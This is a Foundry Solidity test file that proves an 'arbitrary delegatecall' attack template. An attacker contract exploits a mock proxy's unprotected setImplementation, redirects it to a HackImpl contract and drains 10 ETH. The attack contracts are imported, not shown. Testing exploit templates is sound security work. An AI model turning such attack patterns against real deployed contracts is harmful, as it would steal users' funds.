// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/mocks/MockDelegateProxy.sol";
import "../src/attacks/arbitrary_delegatecall.sol";

/**
 * @title ArbitraryDelegatecallTest
 * @notice Proves the `arbitrary_delegatecall` template: the proxy's
 *         setImplementation() has no access control, so the attacker repoints
 *         the delegatecall at HackImpl and drains the proxy's ETH.
 */
contract ArbitraryDelegatecallTest is Test {
    MockDelegateProxy public proxy;
    HackImpl public hack;
    DelegatecallAttack public attackContract;

    function setUp() public {
        proxy = new MockDelegateProxy();
        hack = new HackImpl();
        attackContract = new DelegatecallAttack();
        // proxy holds 10 ETH of user funds
        vm.deal(address(proxy), 10 ether);
    }

    function testArbitraryDelegatecall() public {
        address attacker = makeAddr("attacker");
        vm.prank(attacker);
        attackContract.attack(address(proxy), address(hack));

        // proxy implementation was redirected without auth
        assertEq(proxy.implementation(), address(hack), "implementation swapped");

        // HackImpl.steal() ran in the proxy's context and swept its ETH
        assertEq(address(proxy).balance, 0, "proxy drained");
        assertEq(address(attackContract).balance, 10 ether, "attacker received proxy funds");
    }
}
